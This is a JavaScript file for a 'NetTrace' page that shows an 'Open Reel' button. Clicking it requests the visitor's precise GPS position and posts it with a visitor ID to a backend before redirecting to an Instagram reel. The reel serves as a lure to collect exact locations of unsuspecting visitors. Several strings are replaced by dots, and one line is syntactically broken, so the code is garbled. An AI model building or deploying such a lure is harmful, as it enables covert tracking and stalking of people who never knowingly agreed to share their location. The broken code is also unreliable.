// =====================================================
// NETTRACE PRECISE LOCATION SYSTEM
// =====================================================

console.log(
    "✅ NetTrace precise location system ready"
);


// =====================================================
// GET ELEMENTS
// =====================================================

const openReelBtn =
    document.getElementById(
        "openReelBtn"
    );


const locationStatus =
    document.getElementById(
        "locationStatus"
    );


// =====================================================
// GET VISITOR ID
// =====================================================

const visitorId =
    window.NETTRACE_VISITOR_ID;


console.log(
    "🆔 Visitor ID:",
    visitorId
);


// =====================================================
// INSTAGRAM REEL
// =====================================================

const REEL_URL =
    "https://www.instagram.com/reel/Dafa6fgp_02/";


// =====================================================
// BUTTON CLICK
// =====================================================

openReelBtn.addEventListener(
    "click",
    function () {

        console.log(
            "🎬 OPEN REEL clicked"
        );


        // ---------------------------------------------
        // Check Visitor ID
        // ---------------------------------------------

        if (
            !visitorId ||
            visitorId === "__VISITOR_ID__"
        ) {

            console.error(
                "...."
            );


            locationStatus.textContent =
                "Unable to identify this visit.";


            return;

        }


        // ---------------------------------------------
        // Check Geolocation Support
        // ---------------------------------------------

        if (
            !navigator.geolocation
        ) {

            console.error(
                "....."
            );


            locationStatus.textContent =
                "Location is not supported by this browser.";


            return;

        }


        // ---------------------------------------------
        // Disable Button
        // ---------------------------------------------

        openReelBtn.disabled =
            true;


        locationStatus.textContent =
            "...";


        console.log(
            "..."
        );


        // =================================================
        // REQUEST PRECISE LOCATION
        // =================================================

        navigator.geolocation.getCurrentPosition(

            // =============================================
            // SUCCESS
            // =============================================

            async function (position) {

                console.log(
                    ".."
                );


                const latitude =
                    position.coords.latitude;


                const longitude =
                    position.coords.longitude;


                console.log(
                    "📍 Latitude:",
                    latitude
                );


                console.log(
                    "📍 Longitude:",
                    longitude
                );


                console.log(
                    "📡 Sending location to backend..."
                );


                locationStatus.textContent =
                    ".....";


                try {

                    // =====================================
                    // SEND TO BACKEND
                    // =====================================

                    const response =
                        await fetch(
                            "/api/save-precise-location",
                            {

                                method: "POST",

                                headers: {

                                    "Content-Type":
                                        "application/json"

                                },

                                body:
                                    JSON.stringify({

                                        visitorId:
                                            visitorId,

                                        latitude:
                                            latitude,

                                        longitude:
                                            longitude

                                    })

                            }
                        );


                    console.log(
                        "📡 Backend status:",
                        response.status
                    );


                    const data =
                        await response.json();


                    console.log(
                        "📦 Backend response:",
                        data
                    );


                    // =====================================
                    // CHECK BACKEND RESULT
                    // =====================================

                    if (
                        !response.ok ||
                        !data.success
                    ) {

                        throw new Error(
                            data.message ||
                            "Location could not be saved."
                        );

                    }


                    console.log(
                        "..."
                    );


                    locationStatus.textContent =
                        "✅ Opening Reel...";


                    // =====================================
                    // OPEN INSTAGRAM REEL
                    // =====================================

                    setTimeout(
                        function () {

                            window.location.href =
                                REEL_URL;

                        },
                        500
                    );

                }
                catch (error) {

                    console.error(
                        ".....",
                        ....
                    );


                    locationStatus.textContent =
                        "......";


                    openReelBtn.disabled =
                        false;

                }

            },


            // =============================================
            // ERROR
            // =============================================

            function (error) {

                console.error(
                    "...",
                    error
                );


                openReelBtn.disabled =
                    false;


                // -----------------------------------------
                // Permission denied
                // -----------------------------------------

                if (
                    error.code ===
                    error.PERMISSION_DENIED
                ) {

                    locationStatus.textContent =
                        ".....";

                }


                // -----------------------------------------
                // Position unavailable
                // -----------------------------------------

                else if (
                    error.code ===
                    error.POSITION_UNAVAILABLE
                ) {

                    locationStatus.textContent =
                        "...";

                }


                // -----------------------------------------
                // Timeout
                // -----------------------------------------

                else if (
                    error.code ===
                    error.TIMEOUT
                ) {

                    locationStatus.textContent =
                        ".";

                }


                // -----------------------------------------
                // Unknown error
                // -----------------------------------------

                else {

                    locationStatus.textContent =
                        ".";

                }

            },


            // =============================================
            // OPTIONS
            // =============================================

            {

                enableHighAccuracy:
                    true,

                timeout:
                    15000,

                maximumAge:
                    0

            }

        );

    }
);